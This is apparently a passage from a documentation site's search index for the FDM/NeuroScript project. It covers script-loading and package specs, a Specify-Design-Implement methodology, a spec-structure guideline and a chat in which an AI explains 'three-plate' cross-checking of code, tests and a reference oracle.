backward-compatibility:</p>"},{"location":"script_loading_disc/#1-entrypoint-metadata-header","title":"1\u2003\u201cEntrypoint\u201d metadata header","text":"<p>A zero-friction way to tell the loader what to run right after the file is parsed.</p> <pre><code>:: entry: setup_http          # &lt;- new, optional\n:: version: 0.4.2\n:: description: bootstrap a tiny HTTP server\n\nfunc setup_http() means\n  \u2026\nendfunc\n</code></pre> <ul> <li>Loader rule: if <code>entry</code> exists, call that proc once the file is loaded; otherwise fall back to <code>main</code>.</li> <li>No namespace collision \u2013 each script can still define its own <code>main</code> for interactive use, but the loader won\u2019t touch it unless it\u2019s the <code>entry</code>.</li> <li>The grammar already allows arbitrary metadata keys (see \u201cMetadata\u201d rule) so this is a pure runtime-level change \u2013 no parser tweak required. </li> </ul>"},{"location":"script_loading_disc/#2-module-prefixed-symbols-opt-in","title":"2\u2003Module-prefixed symbols (opt-in)","text":"<p>Solve the \u201csame interpreter, same func table\u201d problem once and for all.</p> <p>Add an optional header:</p> <pre><code>:: module: auth               # all funcs registered as auth.login, auth.jwt\u2026\n</code></pre> <ul> <li>Inside the script you can still call <code>login()</code> directly; the loader rewrites the public symbol table to <code>auth.login</code> etc. on export.</li> <li>When another script needs it: <code>call auth.login(user, pass)</code>.</li> <li>This is entirely a loader-side transformation; no grammar change.</li> </ul>"},{"location":"script_loading_disc/#3-toolscriptloadpath-entry","title":"3\u2003<code>tool.Script.Load(path, entry?)</code>","text":"<p>Let one script pull in (and optionally run) another at runtime.</p> <pre><code>call tool.Script.Load(\"tasks/ns/build.ns.txt\", entry=\"build_all\")\n</code></pre> <p>Concrete semantics:</p> arg required purpose <code>path</code> yes relative FS path (same lookup used by <code>FS.Read</code>) <code>entry</code> no overrides the file\u2019s <code>:: entry:</code> header if present <p>Implementation is tiny: <code>Script.Load</code> (a) reads the file, (b) hands it to the interpreter\u2019s <code>Parse+Register</code> API, (c) if <code>entry</code> (or header) is present, does <code>Eval(entry)</code> once, passing through any return value / error.</p>"},{"location":"script_loading_disc/#4-chaining-inside-a-script-two-idioms","title":"4\u2003Chaining inside a script \u2013 two idioms","text":"<ul> <li>Static chain \u2013 just list the loads from startup.ns.txt:</li> </ul> <pre><code>call tool.Script.Load(\"infra/ns/db.ns.txt\", entry=\"init_db\")\ncall tool.Script.Load(\"infra/ns/cache.ns.txt\")          # relies on its header\ncall tool.Script.Load(\"app/ns/api.ns.txt\")              # ditto\n</code></pre> <ul> <li>Dynamic chain \u2013 emit an event that other scripts subscribe to with the new   <code>on event ...</code> block (0.4.2):</li> </ul> <pre><code>emit {\"topic\": \"app.ready\"}          # anybody\u2019s on-event will run now\n</code></pre> <p>Handlers live in the secondary scripts:</p> <pre><code>on event {\"topic\":\"app.ready\"} do\n  call start_background_jobs()\nendon\n</code></pre> <p>Because handlers are queued in the same interpreter loop, you still get single-threaded determinism. </p>"},{"location":"script_loading_disc/#5-why-not-just-rely-on-main","title":"5\u2003Why not just rely on <code>main</code>?","text":"<p>Once you load two files that both use <code>func main()</code>, whichever one was parsed last wins in the global symbol table \u2013 a foot-gun we\u2019ve tripped over before. An explicit entry name + optional module prefix makes that collision impossible while keeping day-one scripts (that only ever load one file) working unchanged.</p>"},{"location":"script_loading_disc/#6-minimal-code-youd-actually-add","title":"6\u2003Minimal code you\u2019d actually add","text":"<pre><code>// sketch \u2013 inside loader.go\nfunc LoadScript(path, overrideEntry string) error {\n    src := os.ReadFile(path)\n    mod := parser.Parse(src)               // existing parse\n    entry := mod.Metadata[\"entry\"]\n    if overrideEntry != \"\" {\n        entry = overrideEntry\n    }\n    if err := interpreter.Register(mod); err != nil {\n        return err\n    }\n    if entry != \"\" {\n        return interpreter.Call(entry, nil)\n    }\n    return nil\n}\n</code></pre> <p>The <code>Register</code> step would prepend <code>module.</code> to exported names when <code>:: module:</code> is present.</p>"},{"location":"script_loading_disc/#tldr_1","title":"TL;DR","text":"<ul> <li>Use <code>:: entry:</code> to pick the startup proc per script.</li> <li>Optionally add <code>:: module:</code> to namespace everything automatically.</li> <li>Expose a tiny <code>tool.Script.Load()</code> helper so scripts (including <code>startup.ns.txt</code>) can build deterministic chains.</li> </ul> <p>That covers both \u201crun something other than <code>main</code>\u201d and \u201cone script chains another\u201d without touching the core grammar or forcing invasive refactors.</p>"},{"location":"script_loading_spec/","title":"FDM / NeuroScript \u2014 Agent-Facing Guide to Script Loading &amp; Packages","text":"<p>(Updated: now clarifies multi-file packages and the \u201cPottery Barn\u201d rule.)</p>"},{"location":"script_loading_spec/#1-design-principles","title":"1\u2003Design Principles","text":"Principle What it means Opt-in visibility A script exports nothing unless it declares <code>:: package:</code>. No implicit <code>main</code> Loading \u2260 running.  A function runs only when explicitly invoked. Single global symbol space All exports are <code>&lt;package&gt;.&lt;func&gt;</code>, preventing accidental shadowing. Multi-file packages Several files may share the same <code>:: package:</code>; loader merges them.  Duplicate function names \u2192 fast-fail error. Pottery Barn rule \u201cYou load it or run it, you own it.\u201d  Any agent/script that loads or invokes code is responsible for handling its failures &amp; conflicts. Uniform CLI contract Every FDM/NS binary understands the same <code>-script</code>, <code>-entrypoint</code>, <code>-str_args</code> pattern."},{"location":"script_loading_spec/#2-script-anatomy","title":"2\u2003Script Anatomy","text":""},{"location":"script_loading_spec/#21-package-header-exports-enabled","title":"2.1 Package header (exports enabled)","text":"<pre><code>:: package: auth\n\nfunc login(u, p) means \u2026 endfunc   # exported as auth.login\nfunc validate()   means \u2026 endfunc  # exported as auth.validate\n</code></pre> <p>Multiple files may also use <code>:: package: auth</code>. If two functions export the same name, the loader stops with <code>ErrDuplicateSymbol</code> \u2014 satisfy the Pottery Barn rule by avoiding collisions.</p>"},{"location":"script_loading_spec/#22-private-script-no-package-header","title":"2.2 Private script (no package header)","text":"<pre><code># helpers/cleanup.ns         (nothing exported)\n\nfunc init() means \u2026 endfunc\n</code></pre> <p>The file\u2019s functions stay in its local symbol table; other scripts cannot call them via the global interpreter.</p>"},{"location":"script_loading_spec/#3-loading-invoking-at-runtime","title":"3\u2003Loading &amp; Invoking at Runtime","text":"Action Example inside NeuroScript Load another file <code>call tool.Script.Load(\"infra/db.ns\")</code> Call an exported function <code>call auth.login(user, pass)</code> Call a private function <code>call tool.Script.Invoke(\"cleanup.init\")</code> <p><code>tool.Script.Load</code> returns a handle; use <code>Invoke</code> on that handle to reach private symbols without polluting the global map.</p>"},{"location":"script_loading_spec/#4-standard-cli-flags-all-executables","title":"4\u2003Standard CLI Flags (all executables)","text":""},{"location":"script_loading_spec/#41-single-task-invocation","title":"4.1 Single-task invocation","text":"<pre><code>zadeh \\\n  -script        scripts/startup.ns   \\\n  -entrypoint    startup.init         \\\n  -str_args      \"FDM Home Zadeh Server\"\n</code></pre> Flag Meaning <code>-script</code> Path to the NeuroScript file to load <code>-entrypoint</code> Function to run after loading (public <code>pkg.fn</code> or private <code>fn</code>) <code>-str_args</code> Comma-separated plain strings passed as arguments"},{"location":"script_loading_spec/#42-multi-task-invocation","title":"4.2 Multi-task invocation","text":"<pre><code>zadeh \\\n  -script_boot   scripts/boot.ns   -str_args_boot   \"\"            \\\n  -script_jobs   scripts/jobs.ns   -entrypoint_jobs jobs.run       \\\n  -script_api    scripts/api.ns\n</code></pre> <p>Pattern: <code>-script_&lt;tag&gt;</code>, <code>-entrypoint_&lt;tag&gt;</code>, <code>-str_args_&lt;tag&gt;</code>.</p>"},{"location":"script_loading_spec/#5-examples-in-practice","title":"5\u2003Examples in Practice","text":""},{"location":"script_loading_spec/#51-chaining-without-globals","title":"5.1 Chaining without globals","text":"<pre><code># startup.ns\ncall tool.Script.Load(\"infra/db.ns\")          # load-only\ncall infra.db.migrate()                       # explicit call\n\ncall tool.Script.Load(\"services/cache.ns\")\ncall services.cache.warm()\n</code></pre>"},{"location":"script_loading_spec/#52-private-utility-with-explicit-invoke","title":"5.2 Private utility with explicit invoke","text":"<pre><code>zadeh -script helpers/cleanup.ns -entrypoint init\n</code></pre> <p>Even though <code>cleanup.ns</code> exports nothing, the CLI still runs <code>init</code> via the script\u2019s local handle.</p>"},{"location":"script_loading_spec/#6-best-practice-checklist","title":"6\u2003Best-Practice Checklist","text":"<ul> <li>Declare <code>:: package:</code> the moment you expect cross-script calls.</li> <li>Keep scripts private unless sharing is required.</li> <li>Use meaningful package prefixes (<code>auth.db</code>, <code>auth.jwt</code>, <code>utils.strings</code>).</li> <li>Resolve duplicate-symbol errors promptly \u2014 Pottery Barn rule.</li> <li>Document expected entrypoints in header comments.</li> </ul>"},{"location":"script_loading_spec/#7-faq","title":"7\u2003FAQ","text":"<p>Q: What if two files in the same package declare <code>login()</code>? A: Loader fails fast.  The loader/agent that triggered the load \u201cowns\u201d the    fix \u2014 rename or refactor per the Pottery Barn rule.</p> <p>Q: Can I split a package into functional slices? A: Yes. Prefer sub-packages (<code>auth.db</code>, <code>auth.jwt</code>) over numeric suffixes    for readability.</p> <p>Q: Commas inside <code>-str_args</code>? A: Escape per POSIX, or switch to future <code>-json_args</code> once supported.</p> <p>Bottom line: Scripts are private by default; packages export intentionally; loaders enforce fast-fail on collisions; and whoever loads or runs code \u201cowns\u201d any mess created\u2014FDM\u2019s Pottery Barn rule in action.</p> <p>:: language: markdown :: lang_version: n/a :: file_version: 1 :: author: OpenAI Assistant :: created: 2025-06-25 :: modified: 2025-06-25 :: description: Agent-facing guide to script loading, packages, CLI flags, and the Pottery Barn rule in FDM / NeuroScript. :: tags: guide, fdm, neuroscript, packages, cli, pottery-barn-rule, loading :: type: documentation :: subtype: guide :: dependsOn: docs/metadata.md</p>"},{"location":"sdi/","title":"Sdi","text":"<p>Below is a clean Markdown version: the expanded Actors Matrix table first, followed by one concise rationale-and-practice paragraph for each SDI phase.</p>"},{"location":"sdi/#sdi-actors-responsibilities-matrix","title":"SDI Actors &amp; Responsibilities Matrix","text":"Stage Guiding question Actors (H = Human / A = AI agent / C = Code-system) Expected artifacts Failure mode it guards against Specify What problem are we solving &amp; why? Customer: Exec sponsor (H), Product owner (H), End-user reps (H)Vendor: Engagement PM (H), Business analyst (H/A), Workshop chatbot (A)Shared: Legal counsel (H), Requirements validator (C/A) Problem statement, KPIs, constraints, contract outline Building the wrong thing, unowned scope creep Design How could we solve it? Customer: Architecture board (H), UX lead (H)Vendor: Solution architect (H), System designer (H/A), Cost-estimator bot (A)Partners: Security advisor (H), Third-party API owners (H) Architecture diagram, interface &amp; test contracts, prototype, estimate dossier Over-engineering, hidden assumptions, budget shock Implement Make it real &amp; verifiable. Vendor: Dev/ML engineers (H/A), SRE &amp; pipelines (C), QA harness (C/A)Customer: UAT users (H), Ops hand-over team (H)Shared: CI/CD botnet (C), Telemetry stack (C) Running system, tests, deployment scripts, training docs Ad-hoc hacks, fragile release, unusable deliverable"},{"location":"sdi/#phase-spotlights-one-paragraph-each","title":"Phase Spotlights (one-paragraph each)","text":"<p>Specify \u2013 Lock the why and what before touching the how. Run a facilitated workshop (human + AI scribe) to capture pain points, success metrics, and hard constraints; publish a one-page spec that the executive sponsor must sign. Freeze vocabulary with a mini-glossary to prevent later semantic drift. A solid Specify phase keeps domain experts from \u201chelpfully\u201d sketching solutions that derail design later.</p> <p>Design \u2013 Convert the approved spec into a viable architecture while trade-offs are still cheap. Architects (human) and design-bots (AI) iterate on models, spike the riskiest integration, and generate machine-readable interface contracts that future tests will enforce. The phase ends with a design freeze: any scope change after this triggers a formal change order, protecting timeline and budget.</p> <p>Implement \u2013 Build exactly what was frozen in Design, nothing hidden up sleeves. Pair programmers (human+AI) crank code that CI/CD pipelines continuously test against the contractual specs; chaos and load testing run from day one to harden ops. A telemetry dashboard proves KPI attainment, and a clean hand-over package lets customer ops take the wheel without calling the vendor at 3 a.m.</p>"},{"location":"sdi/#sdi-expanded-actors-matrix-v02","title":"SDI \u2014 Expanded Actors Matrix (v0.2)","text":"Stage Guiding Question Actors (H = Human, A = AI/Agent, C = Code/System) Expected Artifacts Failure Mode it Guards Against Specify What problem are we solving &amp; why? Customer-side\u2022 Executive sponsor (H)\u2022 Product owner / SME (H)\u2022 End-user reps (H)Vendor-side\u2022 Engagement PM (H)\u2022 Business analyst (H/A)\u2022 Facilitation chatbot for workshops (A)Shared/Neutral\u2022 Legal/governance counsel (H)\u2022 Requirements parser/validator (C/A) Problem statement, success KPIs, constraints, contract outline Building the wrong thing, unowned scope creep Design How could we solve it? Customer-side\u2022 Architecture review board (H)\u2022 UX lead / prototyping users (H)Vendor-side\u2022 Solution architect (H)\u2022 System designer / modeler (H/A)\u2022 Cost estimator bot (A)Integration Partners\u2022 Security/compliance advisor (H)\u2022 Third-party API owners (H) System architecture, interface &amp; test contracts, prototype/demo, estimate dossier Over-engineering, hidden assumptions, budget shock Implement Make it real &amp; verifiable. Vendor-side\u2022 Dev/ML engineer swarm (H/A)\u2022 SRE / infra-as-code pipelines (C)\u2022 QA automation harness (C/A)Customer-side\u2022 UAT users (H)\u2022 Ops hand-over team (H)Shared/Neutral\u2022 CI/CD botnet (C)\u2022 Observability/telemetry stack (C) Running system, tests, deployment scripts, training material Ad-hoc hacks, fragile release, unusable deliverable"},{"location":"sdi/#notes-rationale","title":"Notes &amp; Rationale","text":"<ol> <li> <p>Explicit Customer vs Vendor Roles    \u2022 Keeps decision rights clear. If a customer insists on diving into Design or even Implementation, you can point to this matrix and ask which hat they\u2019re wearing.</p> </li> <li> <p>H-A-C Triplet    \u2022 Humans for judgement, negotiation, and domain nuance.    \u2022 Agents/LLMs for drafting, summarising, and synthetic tests\u2014cheap iteration.    \u2022 Code/Systems for repeatability and orchestration.</p> </li> <li> <p>PMBOK Alignment without the Bloat</p> </li> </ol> PMBOK Knowledge Area Where it lives in SDI Scope &amp; Stakeholder Specify (problem statement, sponsor sign-off) Risk, Cost, Procurement Design (trade-off log, estimate dossier) Quality, Integration, Communications Implement (CI/CD, telemetry, UAT hand-over) <ol> <li>Churn Counter-Measure    \u2022 Define \u201cRACI-within-SDI\u201d early: e.g. Customer SME = Consulted at Design, Informed during day-to-day Implementation.    \u2022 Lock Design-freeze milestones tied to payment schedules\u2014protects both sides.</li> </ol> <p>Next up?</p> <ul> <li>We can draft a lightweight RACI template or produce sample onboarding slides that visualise these roles. Let me know which deliverable moves the needle for you.</li> </ul>"},{"location":"sdi/#sdi-specify-design-implement-working-summary-v01","title":"SDI (Specify \u2192 Design \u2192 Implement) \u2014 Working Summary v0.1","text":"Stage Guiding Question Typical Actors Expected Artifacts Common Failure Mode it Guards Against Specify What problem are we solving, and why does it matter? Domain experts, product owners, policy thinkers One-page problem statement, success metrics, constraints, \u201cdefinition of done\u201d Building the wrong thing, goal drift Design Given the spec, how could we solve it? Architects, senior engineers, researchers High-level architecture, trade-off log, test strategy, interface contracts Over-engineering, hidden assumptions Implement Make it real and verifiable. Coders, fabricators, AIs, QA Running system, tests, build scripts, deployment notes Ad-hoc hacks, brittleness, unmaintainable code"},{"location":"sdi/#1-why-sdi","title":"1. Why SDI?","text":"<ol> <li> <p>Up-front clarity without heavyweight process.    Big-frameworks (SSADM, SAFe, \u201cAgile-in-name-only\u201d) add ceremony; hack-and-hope adds chaos. SDI keeps the parts that matter (clear specs, deliberate design) and jettisons the church bells.</p> </li> <li> <p>Deliberate skill hand-offs.    \u2022 Specification needs domain context and stakeholder language.    \u2022 Design rewards systems thinking.    \u2022 Implementation thrives on focused execution (human or AI).    By naming the hand-offs, SDI reduces cross-discipline fog.</p> </li> <li> <p>Fails fast on paper, not in production.    Forcing an explicit spec and design surfaces impossibilities early\u2014before sunk cost sets in.</p> </li> </ol>"},{"location":"sdi/#2-core-principles","title":"2. Core Principles","text":"Principle Practical Meaning Lean, not lax One-pager beats a 50-page doc, but some doc beats none. Iterative passes allowed You can loop back, but must be explicit about it (\u201cSpec v2 after user tests\u201d). Contracts &gt; Hope Formalise interface &amp; behaviour contracts in Design so Implement can be automated or delegated, including to LLMs. Traceability Every implementation commit links back to a design line-item and spec requirement\u2014your future debugger will thank you."},{"location":"sdi/#3-where-it-shines","title":"3. Where It Shines","text":"<ul> <li>AI-assisted coding \u2014 Clear spec-&amp;-design prompts dramatically improve LLM output quality.</li> <li>Mixed hardware/software projects \u2014 Natural boundary between electrical, mechanical, and firmware tasks.</li> <li>Policy drafting \u2014 Spec = goals &amp; guard-rails; Design = policy levers &amp; scenarios; Implement = legislation wording &amp; roll-out.</li> </ul>"},{"location":"sdi/#4-how-it-plays-with-existing-methods","title":"4. How It Plays with Existing Methods","text":"If you already use\u2026 SDI acts as\u2026 Scrum/Agile A pre-sprint grooming discipline (Spec &amp; Design) and a definition of \u201cready\u201d. Waterfall A lighter-weight, cyclic micro-waterfall inside larger phases. DevOps The \u201cSpec \u2192 Design\u201d artifacts feed CI/CD pipelines as machine-readable requirements/tests."},{"location":"sdi/#5-payoff-metrics","title":"5. Payoff Metrics","text":"<ul> <li>Fewer spec-change defects after sprint start.</li> <li>Shorter onboarding time (new devs read spec/design first).</li> <li>Higher automated-test coverage (tests drafted in Design stage).</li> <li>Reduced \u201cre-write from scratch\u201d events.</li> </ul>"},{"location":"sdi/#6-what-sdi-is-not","title":"6. What SDI Is Not","text":"<ul> <li>A rigid stage-gate: You can\u2014and should\u2014bounce back when new info arrives.</li> <li>A replacement for user feedback loops: Prototype early, feed results into a Spec vN.</li> <li>A silver bullet: It still needs disciplined humans (and AIs) to enforce the hand-offs.</li> </ul>"},{"location":"sdi/#7-next-steps-for-this-doc","title":"7. Next Steps for This Doc","text":"<ol> <li>Examples \u2014 walk through a real feature or hardware part using SDI tags.</li> <li>Metadata format \u2014 show how SDI headings embed in Go/NeuroScript comments.</li> <li>Tooling hooks \u2014 outline how CI can reject PRs missing SDI links.</li> </ol> <p>(Let me know which of these to flesh out first, or what gaps you see.)</p>"},{"location":"specification_structure/","title":"Spec Structure Guide","text":"<p>:: type: NSproject :: subtype: spec :: version: 0.1.0 :: id: spec-structure-guideline :: status: draft :: dependsOn: docs/metadata.md :: howToUpdate: Review existing specs ensure they align or update this guideline.</p>"},{"location":"specification_structure/#neuroscript-specification-document-structure-guideline","title":"NeuroScript Specification Document Structure Guideline","text":""},{"location":"specification_structure/#1-purpose","title":"1. Purpose","text":"<p>This document defines a standard structure for all specification files (files with <code>:: subtype: spec</code> metadata) within the NeuroScript project. The goal is to ensure consistency, improve readability for all users (human and AI), and make it easier to locate key information quickly.</p>"},{"location":"specification_structure/#2-example-specification-structure","title":"2. Example Specification Structure","text":"<p>All specification documents should generally follow the structure demonstrated below. The Example section (Section 2) should always provide a concise, illustrative example of the format or concept being specified.</p> <pre><code># --- Start Example Spec File ---\n\n:: type: NSproject # Or more specific like NeuroData\n:: subtype: spec\n:: version: 0.1.0\n:: id: example-format-spec\n:: status: draft\n:: dependsOn: docs/metadata.md, ... # Other dependencies\n:: howToUpdate: ...\n\n# Title of the Specification (e.g., NeuroData Widget Format Spec)\n\n## 1. Purpose\n\n*Briefly state the goal and scope of the format or component being specified.*\n\n## 2. Example\n\n*Provide a clear, concise, and illustrative example of the format or concept.*\n*This should give the reader an immediate understanding of what it looks like.*\n```widget-format\n# Example widget data\nWidget {\n  id: \"widget-001\",\n  color: \"blue\",\n  enabled: true\n}\n</code></pre>"},{"location":"specification_structure/#3-design-choices-rationale-optional","title":"3. Design Choices / Rationale (Optional)","text":"<p>Explain the key decisions made during the design. Why was this approach chosen over alternatives? What trade-offs were made?</p>"},{"location":"specification_structure/#4-syntax-format-definition-component-breakdown","title":"4. Syntax / Format Definition / Component Breakdown","text":"<p>Provide the detailed definition of the syntax, format rules, or component parts. Use subsections (e.g., 4.1, 4.2) for clarity. Reference other specifications or standards where appropriate.</p>"},{"location":"specification_structure/#41-component-a","title":"4.1 Component A","text":"<p>Details...</p>"},{"location":"specification_structure/#42-component-b","title":"4.2 Component B","text":"<p>Details...</p>"},{"location":"specification_structure/#5-ebnf-grammar-optional","title":"5. EBNF Grammar (Optional)","text":"<p>If applicable, provide an EBNF (Extended Backus-Naur Form) or similar formal grammar. <pre><code>widget ::= 'Widget' '{' ... '}' ;\n...\n</code></pre></p>"},{"location":"specification_structure/#6-tooling-requirements-interaction-optional","title":"6. Tooling Requirements / Interaction (Optional)","text":"<p>Describe how software tools are expected to interact with this format. What parsing logic is needed? Are there specific validation rules tools should enforce? Are specific NeuroScript TOOLs expected to consume or produce this format?</p>"},{"location":"specification_structure/#-end-example-spec-file-","title":"--- End Example Spec File ---","text":"<p>```</p>"},{"location":"specification_structure/#3-standard-section-definitions","title":"3. Standard Section Definitions","text":"<p>The following sections should be used, in this order:</p> <ol> <li>Purpose: (Required) Clearly and concisely state what the specification defines and its intended scope.</li> <li>Example: (Required) Provide at least one clear, representative example of the format or concept being specified. This should be sufficient for a reader to get a basic understanding at a glance.</li> <li>Design Choices / Rationale: (Optional but Recommended) Explain the reasoning behind key design decisions. This helps others understand the context and potential trade-offs.</li> <li>Syntax / Format Definition: (Required) This is the core section detailing the rules, structure, components, and semantics of the item being specified. Use subsections for clarity.</li> <li>EBNF Grammar: (Optional) Include if a formal grammar aids in defining the syntax precisely.</li> <li>AI Reading This section should give clear, concise instructions for how AIs (such as LLMs) should understand the contents of the file. This may be included in prompts to the AI.</li> <li>AI Writing This section should give clear, concise additional instructions for how AIs (such as LLMs) should write contents of the file, such as cross checks to perform. This may be included in prompts to the AI.</li> <li>Tooling Requirements / Interaction: (Optional but Recommended for data formats) Describe how tools should parse, validate, or otherwise interact with the format. This section will be used primarily when building computer tools to manipulate the format.</li> </ol>"},{"location":"specification_structure/#4-metadata-requirements","title":"4. Metadata Requirements","text":"<p>All specification files must begin with standard file-level metadata as defined in [metadata.md]. This must include: * <code>:: type: NSproject</code> (or a more specific type if applicable, like <code>NeuroData</code>) * <code>:: subtype: spec</code> * <code>:: version: &lt;semver&gt;</code> * <code>:: status: &lt;status_string&gt;</code> (e.g., <code>draft</code>, <code>approved</code>) * <code>:: dependsOn: ...</code> (List dependencies, including <code>docs/metadata.md</code> and this document) * <code>:: howToUpdate: ...</code> (Instructions for maintenance) * <code>:: id: &lt;unique_spec_id&gt;</code> (A unique identifier for the specification)</p> <p>Adhering to this structure will help maintain consistency across all NeuroScript project specification documents.</p>"},{"location":"three_plate_testing/","title":"\"Three Plate\" testing in software -- taking tests to the next level","text":"<p>AJP: A little thought: when testing code, one writes tests. If there are errors, either the test is wrong or the code is wrong; it is very unlikely both are correct -- we are comparing expectations. This reminds me of grinding two plates against each other -- you can be sure the plates match; but if you add a third plate to the mix and swap the grinding pairs properly one may achieve an optically flat surface with NO other tools or references. Can you think of how '3 plate grinding' could be extended to software testing?</p> <p>o3:</p> <p>Analogising \u201cthree-plate lapping\u201d to software quality</p> Grinding plates Software equivalent How the pair-wise \u201cgrind\u201d exposes error Plate A &amp; BPlate B &amp; CPlate C &amp; A Implementation (I)Executable Tests (T)Independent Oracle/Model (O) \u2022 <code>I \u2194 T</code> \u2013 failing tests mean source or tests wrong.\u2022 <code>I \u2194 O</code> \u2013 differential run against the oracle; divergence spots fault in code or model.\u2022 <code>T \u2194 O</code> \u2013 generate test vectors from the oracle and replay; mismatch means tests or model wrong.By rotating pairings, systemic bias in any one artefact is slowly \u201cground flat\u201d."},{"location":"three_plate_testing/#1-choose-your-third-plate-wisely","title":"1  Choose your \u201cthird plate\u201d wisely","text":"Option for the Oracle (O) Pros Cons Reference implementation (slow but simple) Concrete, easy to diff outputs Must keep in lock-step feature-wise Property-based spec (QuickCheck/Gopter) Captures broad invariants, generates mass cases Abstract \u2013 doesn\u2019t catch value-specific bugs Metamorphic relations Detects bugs where absolute oracle is unknown Needs deep domain insight Formal model / theorem prover Mathematical certainty about key properties Costly; doesn\u2019t cover all behavioural beer-keg corners N-version programming (2nd independent team/codebase) Very powerful for safety-critical work Expensive, risk of correlated blind spots <p>Pick whichever gives you independent thinking\u2014independence is the whole point of the third plate.</p>"},{"location":"three_plate_testing/#2-practical-three-plate-workflows","title":"2  Practical \u201cthree-plate\u201d workflows","text":"<ol> <li> <p>Differential\u2013fuzz loop</p> </li> <li> <p>Generate random inputs.</p> </li> <li>Run through I and O; if outputs differ, auto-generate a minimal failing reproducible.</li> <li>Tests (T) are auto-extended with that new case.</li> <li> <p>Result: your test suite continually \u201claps\u201d itself flatter.</p> </li> <li> <p>Spec \u21c4 Code \u21c4 Fixtures rotation</p> </li> <li> <p>Start from a literate spec (Markdown + embedded examples).</p> </li> <li>Extract examples as executable tests (T).</li> <li>Implement (I).</li> <li> <p>Feed real-world traces into a lightweight behaviour recorder; this becomes an empirical oracle (O) for regression.</p> </li> <li> <p>Tri-agent review (fits nicely with FDM\u2019s \u201cInteresting Times Gang\u201d)</p> </li> <li> <p>Coder agent proposes change.</p> </li> <li>Reviewer/test-author agent writes/updates corresponding tests.</li> <li>Model-checker agent (or separate slow impl) signs off by comparing its output.</li> <li>FDM tracks disagreements as graph edges; the voting system decides which plate is warped.</li> </ol>"},{"location":"three_plate_testing/#3-design-hints-for-go-projects","title":"3  Design hints for Go projects","text":"<ul> <li>Keep the reference implementation in a <code>_ref</code> package so you can import it without cyclic deps.</li> <li>Use Go 1.22\u2019s <code>go test -shuffle</code> to randomise order\u2014helps show hidden coupling between plates.</li> <li>For property tests, <code>github.com/leanovate/gopter</code> or <code>github.com/frankban/quicktest</code> integrate cleanly.</li> <li>Add a CI job that only runs <code>I \u2194 O</code> comparison on a giant fuzz corpus\u2014slow but catches deep warps.</li> <li>Store every discovered counter-example as a NeuroData node so future agents can mine patterns (the \u201coptical flat\u201d keeps improving).</li> </ul>"},{"location":"three_plate_testing/#4-caveats-failure-modes","title":"4  Caveats &amp; failure modes","text":"<ul> <li>Shared misconceptions \u2013 if the oracle encodes the same bug as the code, pair-wise checks pass. Independence (different algorithm, different author, property not example, etc.) is your defense.</li> <li>Over-fitting tests \u2013 when T merely petrifies today\u2019s behaviour. Rotate: generate T from O, then occasionally delete some tests and let property checks refill gaps.</li> <li>Cost \u2013 triple work isn\u2019t free. Target it at high-risk/high-impact modules (parsers, consensus, financial calcs) rather than every handler.</li> </ul>"},{"location":"three_plate_testing/#where-could-you-try-this-first","title":"Where could you try this first?","text":"<p>Your FDM indexing layer is a prime candidate: I = current fast indexer, O = slow but simple reference walker, T = curated query/result fixtures.</p> <p>Run the triad in CI until mismatches drop to \\~0 ppm\u2014then you\u2019ll have an \u201coptically flat\u201d indexer without needing an external benchmark.</p> <p>Let me know which module you\u2019re tempted to lap first, and we can sketch a concrete harness in Go.</p> <p>AJP: That sounds awesome but I don't understand much of it. Could you explain for a Bear of Little Brain(tm) please?</p> <p>o3:</p>"},{"location":"three_plate_testing/#three-plate-grinding-for-software-in-plain-english","title":"\u201cThree-plate grinding\u201d for software, in plain English","text":"<p>Imagine you\u2019re trying to make a perfectly flat wooden board. If you rub Board A against Board B, you know one of them must still have bumps, but you can\u2019t tell which. Bring in Board C and keep swapping pairs (A\u2194B, B\u2194C, C\u2194A). Whenever two boards touch, the higher spots get sanded off. Because every board meets every other board, no single board can keep its own hidden bump for long. Soon all three are very, very flat.</p>"},{"location":"three_plate_testing/#translate-the-idea-to-code","title":"Translate the idea to code","text":"Real wood In software Board A Your program (the thing you\u2019re building) Board B Your tests (little scripts that say \u201cthis should happen\u201d) Board C An independent check\u2014something that isn\u2019t your program or your tests but can still say \u201cright\u201d or \u201cwrong\u201d. <p>Why three? With only two (program \u2194 tests), a failure tells you \u201cone of them is wrong\u201d\u2014but not which. Add the third piece and compare all pairs.  Patterns show who\u2019s guilty:</p> Pair that disagrees Likely culprit Program vs Tests and Program vs Check disagree Program has the bug Program vs Tests and Tests vs Check disagree Tests are wrong Program vs Check and Tests vs Check disagree Independent check is wrong"},{"location":"three_plate_testing/#what-can-the-independent-check-be","title":"What can the \u201cindependent check\u201d be?","text":"<ol> <li>A simple, slow version of the program written in the clearest way you can (easy to read, hard to get wrong).</li> <li>Rules/invariants (\u201ctotal can never go negative\u201d, \u201clist stays sorted\u201d) checked automatically.</li> <li>A second team\u2019s implementation if the stakes justify the cost.</li> <li>Recorded real-world behaviour: run yesterday\u2019s proven-good outputs against today\u2019s build.</li> </ol> <p>Pick something that thinks differently from both your fast code and your hand-written tests.</p>"},{"location":"three_plate_testing/#a-tiny-concrete-example-go-ish-pseudocode","title":"A tiny concrete example (Go-ish pseudocode)","text":"<pre><code># Board A: Fast code\nfunc Sum(xs []int) int { /* clever bit-twiddling */ }\n\n# Board B: Tests\nassert Sum([1,2,3]) == 6\nassert Sum([])      == 0\n# etc.\n\n# Board C: Simple reference\nfunc SlowSum(xs []int) int {\n    total := 0\n    for x in xs { total += x }\n    return total\n}\n</code></pre> <p>In CI you run three comparisons:</p> <ol> <li>Program vs Tests \u2013 do the tests pass?</li> <li>Program vs SlowSum \u2013 for 10 000 random lists, are the answers equal?</li> <li>Tests vs SlowSum \u2013 do the expected values in the tests match SlowSum?</li> </ol> <p>Any mismatch points to the faulty board.</p>"},{"location":"three_plate_testing/#why-bother","title":"Why bother?","text":"<ul> <li>Catches sneaky mistakes the tests missed.</li> <li>Cleans the tests themselves\u2014bad expectations stand out.</li> <li>Gives you a deeper feeling of \u201cthis really works\u201d.</li> </ul> <p>You don\u2019t have to do it for every feature.  Aim it at critical parts (money calculations, security checks, indexers).  Start small: write a dumb but crystal-clear version as your third plate, fuzz both implementations against it, and watch the cracks appear.</p> <p>That\u2019s all \u201cthree-plate grinding\u201d is: two comparisons are good; three make the truth obvious.</p>"},{"location":"three_plate_testing/#automating-the-third-plate-oracle-with-ai","title":"Automating the \u201cthird-plate\u201d oracle with AI","text":"<p>(Turning lapping into a lights-out CI job)</p>"},{"location":"three_plate_testing/#1-what-we-already-have","title":"1\u2003What we already have","text":"\u201cPlate\u201d You\u2019re covering it with\u2026 Goal Implementation (I) Production Go code Be fast 